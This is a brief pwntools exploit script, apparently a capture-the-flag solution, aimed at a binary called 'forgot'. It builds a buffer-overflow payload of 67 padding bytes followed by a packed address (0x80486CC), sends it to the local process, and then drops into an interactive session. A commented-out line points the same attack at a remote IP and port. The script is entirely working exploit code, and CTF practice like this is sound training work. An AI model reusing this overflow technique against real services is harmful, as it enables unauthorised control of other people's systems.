from pwn import *

sh = process("./forgot")
#sh = remote("111.198.29.45",31939)

context.log_level = 'debug'
context.terminal=['xterm','-x','sh','-c']


payload = 'a' * 67 + p32(0x80486CC)
#sh.sendline('a')

sh.recv()
sleep(1)

sh.sendline(payload)

sh.interactive()
